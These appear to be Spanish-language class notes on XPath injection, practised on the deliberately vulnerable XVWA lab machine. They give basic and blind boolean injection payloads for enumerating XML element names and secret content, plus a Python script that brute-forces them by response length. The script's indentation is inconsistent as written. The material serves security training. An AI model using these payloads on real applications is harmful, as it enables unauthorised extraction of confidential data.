# Inyecciones XPath

Tags: #XPath #OWASP #Explotacion 

**XPath** es un lenguaje de consultas utilizado en **XML** que permite buscar y recuperar información específica de **documentos XML**. Sin embargo, al igual que otros lenguajes de programación y consultas, XPath también puede tener **vulnerabilidades** que los atacantes pueden aprovechar para comprometer la seguridad de una aplicación web.

Las **vulnerabilidades XPath** son aquellas que se aprovechan de las debilidades en la implementación de consultas XPath en una aplicación web. A continuación, se describen algunos tipos de vulnerabilidades comunes en XPath:

-   **Inyección XPath**: los atacantes pueden utilizar inyección de código malicioso en las consultas XPath para alterar el comportamiento esperado de la aplicación. Por ejemplo, pueden agregar una consulta maliciosa que recupere toda la información del usuario, incluso información confidencial como contraseñas.
-   **Fuerza bruta de XPath**: los atacantes pueden utilizar técnicas de fuerza bruta para adivinar las rutas de XPath y recuperar información confidencial. Esta técnica se basa en intentar diferentes rutas XPath hasta encontrar una que devuelva información confidencial.
-   **Recuperación de información del servidor**: los atacantes pueden utilizar consultas XPath maliciosas para obtener información sobre el servidor, como el tipo de base de datos, la versión de la aplicación, etc. Esta información puede ayudar a los atacantes a planear ataques más sofisticados.
-   **Manipulación de respuestas XPath**: los atacantes pueden manipular las respuestas XPath de la aplicación web para obtener información adicional o alterar el comportamiento de la aplicación. Por ejemplo, pueden modificar una respuesta XPath para crear una cuenta de usuario sin permiso.

Para protegerse contra las vulnerabilidades de XPath, es importante validar todas las entradas de usuario y evitar la construcción dinámica de consultas XPath. Además, se recomienda restringir los permisos de acceso a los recursos de la aplicación web y mantener actualizado el software y los sistemas operativos. Por último, se recomienda utilizar herramientas de análisis de seguridad y realizar pruebas de penetración regulares para identificar y corregir cualquier vulnerabilidad en la aplicación web.

A continuación, se proporciona el enlace directo de descarga a la máquina XVWA 1 de Vulnhub, la cual usamos en esta clase para explotar las vulnerabilidades existentes en XPath:

-   **XVWA 1**: [https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)


## Inyecciones XPath

Este tipo de inyecciones las debemos de hacer en documentos XML.

* [XPath-Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)

Algunas inyecciones básicas son
```bash
❯ ' or '1'='1
❯ " or "1"="1
❯ ' or ''='
❯ " or ""="
```

Primero debemos de averiguar cuantas etiquetas primarias existen en el documento.
```bash
❯ 1' and count(/*)='1             # Contaremos el numero de etiquetas raiz o primarias, si no nos sale el producto colocando el numero 2 al final, quiere decir que solo existe una etiqueta primaria.
```

```bash
❯ 1' and string-length(name(/*[1]))>'2            # Para saber la longitud de la cadena de esa etiqueta primaria, aqui le decimos que si es mayor a dos, si nos muestra el producto es correcto, de lo contrario no lo es
❯ 1' and string-length(name(/*[1]))='7            # Para saber la longitud de la cadena de esa etiqueta primaria, aqui le decimos que si es igual a siete, si nos muestra el producto es correcto, de lo contrario no lo es

❯ 1' and substring(name(/*[1]),1,1)='C            # Para saber el nombre de la etiqueta 'primaria', iremos caracter por caracter. En este caso le estamos diciendo que el primer caracter es igual a 'C'. Si nos sale el producto quiere decir que si es correcta de lo contrario no.

❯ 1' and name(/*[1])='label_name                  # Para saber el nombre de la etiqueta 'primaria', colocamos el [1] para hacer alucion a la primer etiqueta, si hay mas etiquetas cambiamos el numero que esta entre [], 
	# label_name = Nombre de la etiqueta que ya conocemos
```

Ahora debemos de descubrir el nombre de las etiquetas secundarias.
```bash
❯ 1' and count(/*[1]/*)>'7                 # Contaremos el numero de etiquetas secundarias, si nos sale el producto quiere decir que es valida. 
❯ 1' and count(/*[1]/*)='10                # Contaremos el numero de etiquetas secundarias, diciendo si son iguales a 10 etiquetas
```

```bash
❯ 1' and substring(name(/*[1]/*[1]),1,1)='C            # Para saber el nombre de la etiqueta 'secundaria', iremos caracter por caracter. En este caso le estamos diciendo que el primer caracter es igual a 'C'. Si nos sale el producto quiere decir que si es correcta de lo contrario no. El segundo [1] es el que se varia para cada una de las etiquetas
```

```bash
❯ 1' and string-length(name(/*[1]/*[1]))='6            # Para saber la longitud de la cadena de esa etiqueta secundaria, aqui le decimos que si es igual a seis, si nos muestra el producto es correcto, de lo contrario no.
```

Después debemos de conocer el nombre de las sub-etiquetas
```bash
❯ 1' and count(/*[1]/*[1]/*)>'2                   # Contaremos el numero de etiquetas secundarias, si nos sale el producto quiere decir que es valida. El valor que estaremos variando es el segundo [1] a 2,3,4 depende de las etiquetas secundarias anteriormente encontradas
```

```bash
❯ 1' and substring(name(/*[1]/*[1]/*[1]),1,1)='I            # Para saber el nombre de la etiqueta 'subetiqueta', iremos caracter por caracter. En este caso le estamos diciendo que el primer caracter es igual a 'I'. Si nos sale el producto quiere decir que si es correcta de lo contrario no. El tercer [1] es el que se varia para cada una de las sub-etiquetas y ademas debemos de variar el primer '1' que seria mencion al segundo caracter
```

Para averiguar el contenido de una sub-etiqueta
```bash
❯ 1' and substring(Secret,1,1)='E            # Para saber el contenido de la sub-etiqueta, iremos caracter por caracter. En este caso le estamos diciendo que el primer caracter es igual a 'E'. Si nos sale el producto quiere decir que si es correcta de lo contrario no.
```

```bash
❯ 1' and string-length(Secret)>'20            # Para saber la longitud de la cadena del contenido de la sub-etiqueta, aqui le decimos que si es mayor a veinte, si nos muestra el producto es correcto, de lo contrario no
```

Automatizaremos la parte de encontrar el nombre de la etiqueta primaria. Por lo que crearemos un script llamado 'xpath_injection.py'
```python
#!/usr/bin/python3

from pwn import *
import requests
import signal
import sys
import time
import string
import pdb 

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)
    
# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.68.1/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters                    # Englobas los caracteres, mayusculas y minusculas, le agregaremos + ' ' en la parte de ver el contenido de las sub

def XPathInjection():
	data = ""
	p1 = log.progress("Fuerza Bruta")
     p1.status("Iniciando fuerza bruta")
     time.sleep(2)
     p2 = log.progress("Data")

	for position in range(1, 8):       # Para la etiqueta secundaria seria 6 o sea de 1-7, para las bus-etiquetas va a ir de 1-6 o sea 5 recorridos, y el contenido 1-51
		# for sec_position in range(1, 21):    Esto se coloca solo para las sub-etiquetas
			for character in characters:
				post_data = {
					'search': "1' and substring(name(/*[1]),%d,1)='%s" % (position, character),
					# 'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s" % (position, character), # Para buscar el nombre de la etiqueta secundaria
					# 'search': "1' and substring(name(/*[1]/*[1]/*[%d]),%d,1)='%s" % (position, sec_position, character), # Para buscar el nombre de las sub-etiquetas
					# 'search': "1' and substring(Secret,%d,1)='%s" % (position, character), # Para encontrar el contenido de la etiqueta
					'submit': ''
				}
				r = requests.post(main_url, data=post_data)
				# print(len(r.text)) Para saber el tamano 
				
				if len(r.text) != 8681:     # 8686 para la parte de etiqueta secundaria y el '8691 and len(r.text) != 8692:' para las sub-etiquetas, para el contenido de las sub-etiquetas el numero es '8676 and len(r.text) != 8677:'
					data += character
					p2.status(data)
					break
		# if position != 5:  # Esto para sub-etiquetas
			# data += ":"   # Separador de columnas en las sub-etiquetas
     p1.success("Ataque de fuerza bruta concluido")
     p2.success(data)

if __name__ == '__main__':
    XPathInjection()
```

 Nos creamos un script llamado 'data.xml' en donde colocaremos lo descubierto anteriormente 
```javascript
<Coffees>
	<Coffee>
		<ID></ID>
		<name></name>
		<Desc></Desc>
		<Price></Price>
		<Secret></Secret>
		<></>
	</Coffee>
</Coffees>
```